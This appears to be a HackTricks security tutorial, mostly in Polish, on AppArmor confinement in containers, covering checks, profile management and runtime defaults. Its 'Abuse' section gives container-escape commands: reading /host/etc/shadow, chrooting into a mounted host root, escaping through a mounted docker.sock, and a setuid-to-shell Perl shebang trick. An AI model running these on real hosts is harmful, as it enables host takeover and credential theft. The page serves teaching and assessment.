# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

AppArmor to system **Obowiązkowej kontroli dostępu** (Mandatory Access Control), który stosuje ograniczenia przez profile przypisane do poszczególnych programów. W przeciwieństwie do tradycyjnych kontroli DAC, które w dużej mierze zależą od własności użytkownika i grupy, AppArmor pozwala jądru egzekwować politykę przypisaną bezpośrednio do samego procesu. W środowiskach kontenerowych ma to znaczenie, ponieważ workload może mieć wystarczające tradycyjne uprawnienia, aby spróbować wykonać akcję, i mimo to zostać zablokowany, ponieważ jego profil AppArmor nie pozwala na odpowiednią ścieżkę, punkt montowania, zachowanie sieciowe lub użycie capability.

Najważniejszym punktem koncepcyjnym jest to, że AppArmor jest **oparty na ścieżkach**. Ocenia dostęp do systemu plików przez reguły oparte na ścieżkach, a nie przez etykiety jak robi to SELinux. To czyni go przystępnym i potężnym, ale oznacza też, że bind mounty i alternatywne układy ścieżek wymagają ostrożności. Jeśli ta sama zawartość hosta stanie się dostępna pod inną ścieżką, efekt polityki może nie być taki, jak operator początkowo oczekiwał.

## Rola w izolacji kontenerów

Przeglądy bezpieczeństwa kontenerów często kończą się na capabilities i seccomp, ale AppArmor nadal ma znaczenie po tych kontrolach. Wyobraź sobie kontener, który ma więcej przywilejów niż powinien, lub workload, który potrzebował jednej dodatkowej capability ze względów operacyjnych. AppArmor nadal może ograniczać dostęp do plików, zachowanie montowań, sieć i wzorce wykonywania w sposób, który zablokuje oczywistą ścieżkę nadużycia. Dlatego wyłączenie AppArmor „tylko po to, żeby aplikacja działała” może cicho przekształcić jedynie ryzykowną konfigurację w taką, którą da się aktywnie wykorzystać.

## Laboratorium

Aby sprawdzić, czy AppArmor jest aktywny na hoście, użyj:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Aby sprawdzić, pod jakim użytkownikiem działa bieżący proces kontenera:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Różnica jest pouczająca. W normalnym przypadku proces powinien pokazywać kontekst AppArmor powiązany z profilem wybranym przez runtime. W przypadku unconfined ta dodatkowa warstwa ograniczeń znika.

Możesz także sprawdzić, co Docker uważa, że zastosował:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Użycie w czasie wykonywania

Docker może zastosować domyślny lub niestandardowy profil AppArmor, jeśli host go obsługuje. Podman może także integrować się z AppArmor na systemach opartych na AppArmor, chociaż na dystrybucjach z priorytetem SELinux drugi system MAC często dominuje. Kubernetes może udostępniać politykę AppArmor na poziomie workloadów na węzłach, które faktycznie obsługują AppArmor. LXC i powiązane środowiska system-container z rodziny Ubuntu również szeroko korzystają z AppArmor.

W praktyce AppArmor nie jest "Docker feature". To cecha host-kernel, którą kilka runtime'ów może zdecydować się zastosować. Jeśli host jej nie obsługuje albo runtime jest ustawiony na uruchomienie unconfined, domniemana ochrona w praktyce nie istnieje.

Na hostach z obsługą AppArmor zdolnych do uruchomienia Docker najbardziej znanym profilem domyślnym jest `docker-default`. Ten profil jest generowany z AppArmor template Moby i jest ważny, ponieważ wyjaśnia, dlaczego niektóre PoC oparte na capability nadal zawodzą w domyślnym kontenerze. W szerokich zarysach `docker-default` pozwala na zwykłe operacje sieciowe, zabrania zapisów do dużej części `/proc`, odmawia dostępu do wrażliwych części `/sys`, blokuje operacje montowania i ogranicza ptrace tak, aby nie było to ogólne narzędzie do sondowania hosta. Zrozumienie tej bazy pomaga rozróżnić "the container has `CAP_SYS_ADMIN`" od "the container can actually use that capability against the kernel interfaces I care about".

## Zarządzanie profilami

AppArmor profiles są zwykle przechowywane pod `/etc/apparmor.d/`. Częstą konwencją nazewnictwa jest zastępowanie ukośników w ścieżce do pliku wykonywalnego kropkami. Na przykład profil dla `/usr/bin/man` jest zwykle przechowywany jako `/etc/apparmor.d/usr.bin.man`. Ta szczegółowa informacja ma znaczenie zarówno podczas obrony, jak i oceny, ponieważ gdy poznasz aktywną nazwę profilu, często możesz szybko zlokalizować odpowiadający plik na hoście.

Przydatne polecenia do zarządzania po stronie hosta obejmują:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Powód, dla którego te polecenia mają znaczenie w odniesieniu do container-security, polega na tym, że wyjaśniają, jak profile są faktycznie budowane, ładowane, przełączane do complain mode i modyfikowane po zmianach w aplikacji. Jeśli operator ma zwyczaj przenoszenia profili do complain mode podczas rozwiązywania problemów i zapomina przywrócić enforcement, kontener może wyglądać na chroniony w dokumentacji, podczas gdy w rzeczywistości zachowuje się znacznie luźniej.

### Tworzenie i aktualizacja profili

`aa-genprof` może obserwować zachowanie aplikacji i pomóc interaktywnie wygenerować profil:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` może wygenerować szablon profilu, który później można wczytać za pomocą `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Gdy plik wykonywalny ulegnie zmianie i polityka wymaga aktualizacji, `aa-logprof` może odtworzyć odmowy znalezione w logach i pomóc operatorowi w podjęciu decyzji, czy na nie zezwolić, czy je odrzucić:
```bash
sudo aa-logprof
```
### Logi

Odmowy AppArmor są często widoczne w `auditd`, syslog lub w narzędziach takich jak `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
To jest użyteczne zarówno operacyjnie, jak i ofensywnie. Obrońcy używają tego, by udoskonalać profile. Atakujący korzystają z tego, aby dowiedzieć się, która dokładna ścieżka lub operacja jest odrzucana oraz czy AppArmor jest mechanizmem blokującym łańcuch eksploatacji.

### Identifying The Exact Profile File

Kiedy runtime pokazuje konkretną nazwę profilu AppArmor dla kontenera, często przydatne jest przypisanie tej nazwy do pliku profilu na dysku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
This is especially useful during host-side review because it bridges the gap between "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".

## Misconfigurations

Najbardziej oczywistym błędem jest `apparmor=unconfined`. Administratorzy często ustawiają to podczas debugowania aplikacji, która nie działała, ponieważ profil poprawnie zablokował coś niebezpiecznego lub nieoczekiwanego. Jeśli flaga pozostanie w środowisku produkcyjnym, cała warstwa MAC zostaje w praktyce usunięta.

Innym subtelnym problemem jest zakładanie, że bind mounts są nieszkodliwe, ponieważ uprawnienia plików wyglądają normalnie. Ponieważ AppArmor działa na podstawie ścieżek, ujawnianie ścieżek hosta pod alternatywnymi punktami montowania może źle współdziałać z regułami opartymi na ścieżkach. Trzecim błędem jest zapominanie, że nazwa profilu w pliku konfiguracyjnym niewiele znaczy, jeśli jądro hosta faktycznie nie egzekwuje AppArmor.

## Abuse

Gdy AppArmor nie działa, operacje wcześniej ograniczone mogą nagle zacząć działać: odczyt wrażliwych ścieżek przez bind mounts, dostęp do części procfs lub sysfs, które powinny pozostać trudniejsze w użyciu, wykonywanie operacji związanych z montowaniem jeśli capabilities/seccomp także na to pozwalają, lub używanie ścieżek, które profil normalnie zablokowałby. AppArmor często wyjaśnia, dlaczego capability-based breakout attempt "should work" na papierze, a mimo to zawodzi w praktyce. Usuń AppArmor, a ta sama próba może zacząć się powieść.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Jeśli container ma także niebezpieczną capability taką jak `CAP_SYS_ADMIN`, jednym z najpraktyczniejszych testów jest sprawdzenie, czy AppArmor jest elementem kontrolnym blokującym operacje montowania lub dostęp do wrażliwych systemów plików jądra:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
W środowiskach, w których ścieżka hosta jest już dostępna przez bind mount, utrata AppArmor może również przekształcić read-only information-disclosure issue w bezpośredni dostęp do plików hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Sens tych poleceń nie polega na tym, że sam AppArmor powoduje breakout. Chodzi o to, że po usunięciu AppArmor wiele ścieżek nadużyć opartych na systemie plików i punktach montowania staje się od razu możliwych do przetestowania.

### Pełny przykład: AppArmor wyłączony + root hosta zamontowany

Jeśli kontener ma już root hosta bind-mounted pod `/host`, usunięcie AppArmor może zamienić zablokowaną ścieżkę nadużyć systemu plików w pełny host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Gdy powłoka wykonuje się przez system plików hosta, aplikacja efektywnie wydostała się poza granicę kontenera:
```bash
id
hostname
cat /etc/shadow | head
```
### Pełny przykład: AppArmor Disabled + Runtime Socket

Jeśli prawdziwą barierą był AppArmor chroniący stan runtime, zamontowany socket może wystarczyć do pełnej ucieczki:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dokładna ścieżka zależy od punktu montowania, ale efekt końcowy jest taki sam: AppArmor przestaje zapobiegać dostępowi do API środowiska uruchomieniowego, a API środowiska uruchomieniowego może uruchomić kontener kompromitujący hosta.

### Full Example: Path-Based Bind-Mount Bypass

Ponieważ AppArmor jest oparty na ścieżkach, ochrona `/proc/**` nie chroni automatycznie tej samej zawartości procfs hosta, gdy jest ona dostępna pod inną ścieżką:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Skutki zależą od tego, co dokładnie jest zamontowane i czy alternatywna ścieżka nie omija także innych mechanizmów kontroli, ale ten wzorzec jest jednym z najważniejszych powodów, dla których AppArmor należy oceniać razem z układem montowania, a nie w izolacji.

### Full Example: Shebang Bypass

Polityka AppArmor czasami celuje w ścieżkę interpretera w sposób, który nie w pełni uwzględnia wykonywanie skryptów poprzez obsługę shebang. Historyczny przykład dotyczył użycia skryptu, którego pierwszy wiersz wskazuje na ograniczony interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Tego rodzaju przykład jest ważnym przypomnieniem, że intencje profilu i rzeczywista semantyka wykonania mogą się rozjechać. Podczas przeglądu AppArmor w środowiskach kontenerowych należy zwrócić szczególną uwagę na łańcuchy interpreterów i alternatywne ścieżki wykonania.

## Checks

Celem tych kontroli jest szybkie odpowiedzenie na trzy pytania: czy AppArmor jest włączony na hoście, czy bieżący proces jest ograniczony, oraz czy środowisko uruchomieniowe faktycznie zastosowało profil dla tego kontenera?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Co jest tutaj interesujące:

- Jeśli `/proc/self/attr/current` pokazuje `unconfined`, workload nie korzysta z ograniczeń AppArmor.
- Jeśli `aa-status` pokazuje AppArmor wyłączony lub niezaładowany, każda nazwa profilu w konfiguracji runtime jest w większości kosmetyczna.
- Jeśli `docker inspect` pokazuje `unconfined` lub nieoczekiwany, niestandardowy profil, często to właśnie powoduje, że ścieżka nadużycia oparta na systemie plików lub mountach działa.

Jeśli kontener ma już podniesione uprawnienia z powodów operacyjnych, pozostawienie AppArmor włączonego często robi różnicę między kontrolowanym wyjątkiem a znacznie szerszą awarią bezpieczeństwa.

## Domyślne ustawienia runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Włączony domyślnie na hostach obsługujących AppArmor | Używa profilu AppArmor `docker-default`, chyba że zostanie nadpisany | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zależy od hosta | AppArmor jest obsługiwany przez `--security-opt`, ale dokładny domyślny stan zależy od hosta/runtime i jest mniej uniwersalny niż udokumentowany przez Docker profil `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Domyślny warunkowo | Jeśli `appArmorProfile.type` nie jest określony, domyślną wartością jest `RuntimeDefault`, ale jest stosowana tylko wtedy, gdy AppArmor jest włączony na węźle | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` z słabym profilem, węzły bez wsparcia AppArmor |
| containerd / CRI-O under Kubernetes | Zależy od wsparcia węzła/runtime | Popularne runtime'y wspierane przez Kubernetes obsługują AppArmor, ale faktyczne egzekwowanie zależy od wsparcia węzła oraz ustawień workloadu | Tak jak w wierszu Kubernetes; bezpośrednia konfiguracja runtime może też całkowicie pominąć AppArmor |

Dla AppArmor najważniejszą zmienną jest często **host**, nie tylko runtime. Ustawienie profilu w manifeście nie stworzy ograniczenia na węźle, gdzie AppArmor nie jest włączony.
